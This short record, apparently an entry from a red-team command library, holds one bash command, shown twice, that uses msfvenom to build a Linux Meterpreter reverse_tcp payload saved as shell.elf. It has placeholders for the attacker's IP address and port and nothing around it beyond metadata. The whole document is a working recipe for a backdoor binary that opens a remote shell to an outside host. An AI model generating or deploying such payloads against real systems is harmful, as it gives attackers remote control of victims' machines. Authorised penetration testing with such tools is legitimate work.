---
id: 8744333d-4428-4600-801e-85ab66a9abc4
name: Linux ELF binary
type: command
executor: bash
data: 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your
  Port to Connect On> -f elf > shell.elf

  '
output: null
created_at: '2020-07-14T18:14:34.232628+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Linux ELF binary

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf

```
